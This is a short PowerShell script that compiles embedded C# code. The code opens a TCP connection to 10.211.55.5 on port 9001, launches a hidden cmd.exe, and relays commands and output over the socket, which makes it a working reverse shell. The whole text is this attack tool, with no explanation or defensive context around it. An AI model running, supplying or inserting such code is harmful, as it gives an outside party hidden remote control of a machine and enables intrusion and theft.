$code = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;

public class Shell {
    public static void Start(string ip, int port) {
        TcpClient client = new TcpClient(ip, port);
        Stream stream = client.GetStream();
        StreamReader reader = new StreamReader(stream);
        StreamWriter writer = new StreamWriter(stream);
        
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.CreateNoWindow = true;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardInput = true;
        p.StartInfo.RedirectStandardError = true;
        p.Start();

        // Redirect streams in separate threads to avoid blocking
        System.IO.StreamWriter pIn = p.StandardInput;
        pIn.AutoFlush = true;
        
        // Background thread to relay output
        new System.Threading.Thread(() => {
            char[] buffer = new char[1024];
            int read;
            while ((read = p.StandardOutput.Read(buffer, 0, buffer.Length)) > 0) {
                writer.Write(buffer, 0, read);
                writer.Flush();
            }
        }).Start();

        // Main thread handles input
        while (true) {
            string cmd = reader.ReadLine();
            if (cmd == "exit") break;
            pIn.WriteLine(cmd);
        }
        p.Kill();
        client.Close();
    }
}
"@

# Add the type to the current session
Add-Type -TypeDefinition $code -Language CSharp

# Execute the shell
[Shell]::Start("10.211.55.5", 9001)
